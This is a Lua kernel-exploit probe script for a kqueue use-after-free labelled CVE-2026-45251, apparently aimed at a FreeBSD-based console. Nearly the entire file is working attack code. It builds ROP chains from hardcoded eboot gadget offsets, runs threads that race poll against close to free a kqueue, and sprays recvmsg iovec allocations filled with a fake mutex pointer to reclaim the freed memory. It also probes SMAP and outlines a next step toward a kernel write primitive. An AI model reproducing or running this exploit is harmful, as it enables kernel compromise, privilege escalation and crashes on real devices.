-- CRASH_CLASS: HIGH
-- PROBE 500h: kqueue cross-zone reclaim via recvmsg iov spray (CVE-2026-45251)
--
-- setsockopt spray dead (500g: 0 hits at 248B across all levels/options).
-- New vector: recvmsg(29) with >8 iovecs → kernel malloc(iovlen*16, M_IOV).
-- Child blocks in recvmsg (empty socket) → allocation persists.
-- 16 iovecs × 16B = 256B → same general-malloc zone as struct kqueue.
-- Fill every qword with &fake_mtx → si_mtx reads our userland pointer.
--
-- Outcomes:
-- - Process dies during poll timeout → SMAP active, si_mtx read our value → CONFIRMED
-- - Process survives, fake_mtx modified → SMAP off, exploit usable → CONFIRMED
-- - Process survives, no modification → recvmsg didn't use malloc (iov on stack) → need alt

print("=== PROBE 500h: RECVMSG IOV SPRAY (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_pop_r8  = eb + 0x991
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- Ignore signals 11, 12, 13
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

-- ========== Fake mutex ==========
-- struct mtx: lock_object(16B) + mtx_lock(8B at +0x10)
-- MTX_UNOWNED = 0x4 on FreeBSD 11
local fake_mtx = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(fake_mtx) + i, 0) end
-- lo_name: valid readable pointer (point to ourselves)
wq(N(fake_mtx), uint64(N(fake_mtx) + 0x20))
-- lo_flags: MTX_DEF = 1
wd(N(fake_mtx) + 8, 1)
-- lo_data: 0
wd(N(fake_mtx) + 0xC, 0)
-- mtx_lock: MTX_UNOWNED = 4
wq(N(fake_mtx) + 0x10, uint64(4))
-- Canary qwords for modification detection
wq(N(fake_mtx) + 0x18, uint64(0xDEAD0001DEAD0001))
wq(N(fake_mtx) + 0x20, uint64(0xDEAD0002DEAD0002))
wq(N(fake_mtx) + 0x28, uint64(0xDEAD0003DEAD0003))

local fake_mtx_addr = uint64(N(fake_mtx))
print("fake_mtx=" .. fmt(fake_mtx_addr) .. " (mtx_lock@+0x10=0x4)")

-- ========== Build iov array: 16 entries × 16B = 256B, every qword = &fake_mtx ==========
-- struct iovec { void *iov_base; size_t iov_len; } = 16B
-- With 16 entries: offsets 0x00-0xFF, each qword = &fake_mtx
-- So si_mtx at any offset reads &fake_mtx

local iov_buf = memory.alloc(256 + 16)
for i = 0, 252, 8 do
    wq(N(iov_buf) + i, fake_mtx_addr)
end

-- struct msghdr for recvmsg (48B)
-- msg_name=NULL, msg_namelen=0, msg_iov=&iov, msg_iovlen=16,
-- msg_control=NULL, msg_controllen=0, msg_flags=0
local msghdr_buf = memory.alloc(0x30)
wq(N(msghdr_buf), uint64(0))           -- msg_name
wd(N(msghdr_buf) + 8, 0)               -- msg_namelen
wq(N(msghdr_buf) + 0x10, uint64(N(iov_buf)))  -- msg_iov
wd(N(msghdr_buf) + 0x18, 16)           -- msg_iovlen
wq(N(msghdr_buf) + 0x20, uint64(0))    -- msg_control
wd(N(msghdr_buf) + 0x28, 0)            -- msg_controllen
wd(N(msghdr_buf) + 0x2C, 0)            -- msg_flags

-- ========== Child thread builders ==========

local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- poll(pollfd, 1, 3000)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer(gate_rd, target_fd, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- Spray child: waits on gate, then calls recvmsg(sock_rd, &msghdr, 0) → blocks
-- recvmsg = syscall 29
local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- Wait on gate
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- Write marker = 1 (spray child is running)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- recvmsg(sock_rd, &msghdr, 0) → blocks (empty socket)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(29)); emit(stub)
    -- If recvmsg returns (socket closed), write result to marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- ========== Section A: Verify recvmsg blocks with >8 iovecs ==========
print("")
print("--- A: recvmsg blocking test ---")

local sv_test = memory.alloc(8)
wd(N(sv_test), 0xFFFF); wd(N(sv_test) + 4, 0xFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv_test))) end)
local test_rd = rd(N(sv_test)) or 0xFFFF
local test_wr = rd(N(sv_test) + 4) or 0xFFFF
print("  socketpair: rd=" .. test_rd .. " wr=" .. test_wr)

if test_rd == 0xFFFF then
    print("  socketpair failed, aborting")
    print("=== 500h COMPLETE ===")
    return
end

-- Create separate iov+msghdr per spray child (each needs own copy since kernel modifies)
-- Actually for recvmsg blocking case, kernel doesn't modify the userland copy
-- But let's be safe and make separate copies anyway

local gT_r, gT_w = make_gate()
local mT = memory.alloc(8); wq(N(mT), uint64(0xAAAAAAAA))

if gT_r then
    local test_par = build_spray_child(gT_r, test_rd, N(msghdr_buf), N(mT))
    pcall(function() mk(455)(test_par, uint64(0x38)) end)

    -- Open gate → child runs → should block in recvmsg
    pcall(function() mk(4)(uint64(gT_w), uint64(N(one_byte)), uint64(1)) end)

    -- Wait a bit for child to enter recvmsg
    for d = 1, 500000 do local _ = rd(N(mT)) end

    local mval = rd(N(mT))
    if mval == 1 then
        print("  child reached recvmsg (marker=1), checking if blocked...")
        -- Wait more — if recvmsg returned immediately, marker would change to return value
        for d = 1, 500000 do local _ = rd(N(mT)) end
        local mval2 = rd(N(mT))
        if mval2 == 1 then
            print("  child BLOCKED in recvmsg (marker still 1) <<<")
        else
            print("  child returned from recvmsg: marker=" .. tostring(mval2))
            print("  recvmsg not blocking — spray won't persist!")
        end
    elseif mval == 0xAAAAAAAA then
        print("  child hasn't reached recvmsg yet — may need more time")
    else
        print("  unexpected marker=" .. tostring(mval))
    end

    -- Cleanup: close socket → unblocks child
    pcall(function() mk(6)(uint64(test_rd)) end)
    pcall(function() mk(6)(uint64(test_wr)) end)
    pcall(function() mk(6)(uint64(gT_r)) end)
    pcall(function() mk(6)(uint64(gT_w)) end)
    for d = 1, 200000 do local _ = rd(N(mT)) end
    print("  cleanup done, marker=" .. tostring(rd(N(mT))))
end

if not alive() then
    print("*** DIED in section A ***")
    print("=== 500h COMPLETE ===")
    return
end

-- ========== Section B: Control race (no spray, should survive) ==========
print("")
print("--- B: control race (no spray) ---")

local sc_kqueue = mk(362)

local function run_control()
    local kq = sgn(sc_kqueue())
    if kq < 0 then return "kq_fail" end
    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r then pcall(function() mk(6)(uint64(kq)) end); return "gate_fail" end
    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)
    local mA = memory.alloc(8); wq(N(mA), uint64(0xAAAAAAAA))
    local mB = memory.alloc(8); wq(N(mB), uint64(0xBBBBBBBB))
    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA)), uint64(0x38)) end)
    pcall(function() mk(455)(build_closer(gB_r, kq, N(mB)), uint64(0x38)) end)
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 30000 do local _ = rd(N(mA)) end
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
    for w = 1, 6000000 do
        if rd(N(mA)) ~= 0xAAAAAAAA and rd(N(mB)) ~= 0xBBBBBBBB then break end
    end
    if not alive() then return "died" end
    local pv = rd(N(mA)) or 0
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)
    return string.format("poll=%d", pv)
end

for ci = 1, 2 do
    local r = run_control()
    print("  control " .. ci .. ": " .. tostring(r))
    if r == "died" then
        print("=== 500h COMPLETE (control died) ===")
        return
    end
end

-- ========== Section C: Spray race ==========
print("")
print("--- C: kqueue race + recvmsg iov spray ---")

local NUM_SPRAY = 10

local function run_spray_race(iter_label)
    print("[" .. iter_label .. "]")

    -- Reset fake_mtx
    wq(N(fake_mtx) + 0x10, uint64(4))  -- MTX_UNOWNED
    wq(N(fake_mtx) + 0x18, uint64(0xDEAD0001DEAD0001))
    wq(N(fake_mtx) + 0x20, uint64(0xDEAD0002DEAD0002))

    -- Create target kqueue
    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue fail"); return "kq_fail" end
    print("  kq_fd=" .. kq)

    -- Poller/closer gates
    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  gate fail"); return "gate_fail"
    end

    -- Spray children: create socketpairs and gates BEFORE the race
    local spray_data = {}
    for s = 1, NUM_SPRAY do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
        local sr = rd(N(sv)) or 0xFFFF
        local sw = rd(N(sv) + 4) or 0xFFFF
        local gr, gw = make_gate()
        local mk_addr = memory.alloc(8); wq(N(mk_addr), uint64(0xCCCCCCCC))

        -- Each spray child needs its own msghdr copy (pointing to shared iov_buf)
        local mh = memory.alloc(0x30)
        wq(N(mh), uint64(0))
        wd(N(mh) + 8, 0)
        wq(N(mh) + 0x10, uint64(N(iov_buf)))
        wd(N(mh) + 0x18, 16)  -- 16 iovecs
        wq(N(mh) + 0x20, uint64(0))
        wd(N(mh) + 0x28, 0)
        wd(N(mh) + 0x2C, 0)

        if sr ~= 0xFFFF and gr then
            local par = build_spray_child(gr, sr, N(mh), N(mk_addr))
            pcall(function() mk(455)(par, uint64(0x38)) end)
            spray_data[#spray_data + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=mk_addr, mh=mh}
        end
    end
    print("  spray children: " .. #spray_data .. "/" .. NUM_SPRAY)

    -- Pollfd
    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)
    local mA = memory.alloc(8); wq(N(mA), uint64(0xAAAAAAAA))
    local mB = memory.alloc(8); wq(N(mB), uint64(0xBBBBBBBB))

    -- Launch poller and closer
    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA)), uint64(0x38)) end)
    pcall(function() mk(455)(build_closer(gB_r, kq, N(mB)), uint64(0x38)) end)

    -- Phase 1: Poller enters poll
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mA)) end

    -- Phase 2: Closer fires → kqueue freed
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

    -- Wait for close to complete
    for w = 1, 300000 do
        if rd(N(mB)) ~= 0xBBBBBBBB then break end
    end
    if not alive() then
        print("  *** DIED after close ***"); return "died_close"
    end
    print("  close done (marker=" .. tostring(rd(N(mB))) .. ")")

    -- Phase 3: Open ALL spray gates → children enter recvmsg → iov malloc reclaims
    for _, sd in ipairs(spray_data) do
        pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
    end

    -- Wait for spray children to reach recvmsg
    for d = 1, 300000 do local _ = rd(N(fake_mtx)) end
    local spray_running = 0
    for _, sd in ipairs(spray_data) do
        if rd(N(sd.mk)) == 1 then spray_running = spray_running + 1 end
    end
    print("  spray running: " .. spray_running .. "/" .. #spray_data)

    if not alive() then
        print("  *** DIED during spray launch ***"); return "died_spray"
    end

    -- Phase 4: Wait for poll timeout (3s) → seltdclear reads from spray
    print("  waiting for poll timeout (~3s)...")
    local poll_done = false
    for w = 1, 8000000 do
        if not alive() then break end
        local a = rd(N(mA))
        if a and a ~= 0xAAAAAAAA then poll_done = true; break end
    end

    if not alive() then
        print("  *** PROCESS DIED during seltdclear ***")
        print("  >>> si_mtx READ OUR VALUE → SPRAY RECLAIM CONFIRMED <<<")
        print("  >>> SMAP likely active (kernel panic on userland ptr) <<<")
        return "died_seltdclear"
    end

    local poll_rv = rd(N(mA)) or 0xAA
    print("  poll_rv=" .. tostring(poll_rv) .. " poll_done=" .. tostring(poll_done))

    -- Check fake_mtx: was mtx_lock touched?
    local mtx_lock_val = rq(uint64(N(fake_mtx) + 0x10))
    local canary1 = rq(uint64(N(fake_mtx) + 0x18))
    local canary2 = rq(uint64(N(fake_mtx) + 0x20))
    print("  fake_mtx.mtx_lock=" .. fmt(mtx_lock_val) .. " (4=untouched)")

    local mtx_h, mtx_l = get_hi_lo(mtx_lock_val)
    local c1h, c1l = get_hi_lo(canary1)
    local c2h, c2l = get_hi_lo(canary2)
    local was_locked = (mtx_h ~= 0 or mtx_l ~= 4)
    local c1_changed = (c1h ~= 0xDEAD0001 or c1l ~= 0xDEAD0001)
    local c2_changed = (c2h ~= 0xDEAD0002 or c2l ~= 0xDEAD0002)

    if was_locked then
        print("  >>> fake_mtx WAS LOCKED (value changed from 0x4) <<<")
        print("  >>> CROSS-ZONE RECLAIM CONFIRMED — SMAP OFF <<<")
    end
    if c1_changed then print("  canary1 modified: " .. fmt(canary1)) end
    if c2_changed then print("  canary2 modified: " .. fmt(canary2)) end

    -- Cleanup spray children: close their sockets → unblocks recvmsg
    for _, sd in ipairs(spray_data) do
        pcall(function() mk(6)(uint64(sd.rd)) end)
        pcall(function() mk(6)(uint64(sd.wr)) end)
        pcall(function() mk(6)(uint64(sd.gr)) end)
        pcall(function() mk(6)(uint64(sd.gw)) end)
    end
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    if was_locked or c1_changed or c2_changed then return "hit" end
    return "miss"
end

-- Run spray race iterations
local got_hit = false
for iter = 1, 5 do
    if not alive() then break end
    local result = run_spray_race(string.format("iter %d/5", iter))
    if result == "hit" then
        got_hit = true
        print("=== RECLAIM CONFIRMED (SMAP OFF) ===")
        break
    elseif result == "died_seltdclear" then
        got_hit = true
        print("=== RECLAIM CONFIRMED (SMAP ON → kernel panic) ===")
        break
    elseif result and result:match("died") then
        got_hit = true
        break
    end
    print("")
end

-- ========== Section D: Also try 9 iovecs (144B → 256B zone) ==========
-- In case kernel uses 9+ threshold instead of 8+
if alive() and not got_hit then
    print("")
    print("--- D: 9-iovec variant (144B) ---")
    local iov9 = memory.alloc(144 + 16)
    for i = 0, 140, 8 do wq(N(iov9) + i, fake_mtx_addr) end
    local mh9 = memory.alloc(0x30)
    wq(N(mh9), uint64(0)); wd(N(mh9)+8, 0)
    wq(N(mh9)+0x10, uint64(N(iov9))); wd(N(mh9)+0x18, 9)
    wq(N(mh9)+0x20, uint64(0)); wd(N(mh9)+0x28, 0); wd(N(mh9)+0x2C, 0)

    -- Quick test: does child block with 9 iovecs?
    local sv9 = memory.alloc(8)
    wd(N(sv9), 0xFFFF); wd(N(sv9)+4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv9))) end)
    local r9 = rd(N(sv9)) or 0xFFFF
    local w9 = rd(N(sv9)+4) or 0xFFFF
    if r9 ~= 0xFFFF then
        local g9r, g9w = make_gate()
        local m9 = memory.alloc(8); wq(N(m9), uint64(0xAAAAAAAA))
        if g9r then
            local p9 = build_spray_child(g9r, r9, N(mh9), N(m9))
            pcall(function() mk(455)(p9, uint64(0x38)) end)
            pcall(function() mk(4)(uint64(g9w), uint64(N(one_byte)), uint64(1)) end)
            for d = 1, 500000 do local _ = rd(N(m9)) end
            local v9 = rd(N(m9))
            print("  9-iov child marker=" .. tostring(v9) .. (v9==1 and " (blocked)" or ""))
            pcall(function() mk(6)(uint64(r9)) end)
            pcall(function() mk(6)(uint64(w9)) end)
            pcall(function() mk(6)(uint64(g9r)) end)
            pcall(function() mk(6)(uint64(g9w)) end)
        end
    end
end

print("")
print("========================================")
if not alive() then
    print("*** PROCESS DIED → SPRAY RECLAIM CONFIRMED ***")
    print("*** CVE-2026-45251 IS EXPLOITABLE ***")
elseif got_hit then
    print("*** SPRAY RECLAIM CONFIRMED (SMAP OFF) ***")
    print("*** CVE-2026-45251 IS EXPLOITABLE ***")
    print("Next: forge si_mtx → controlled TAILQ_REMOVE → kernel write")
else
    print("No hit — recvmsg iov may not reclaim (wrong zone, per-CPU cache, or no malloc)")
    print("Try: more spray, zone priming, sendmsg variant, or knote spray")
end
print("canary=" .. (alive() and N(native.fcall_with_rax(stub, 20)) or "DEAD"))
print("========================================")
print("")
print("=== PROBE 500h COMPLETE ===")
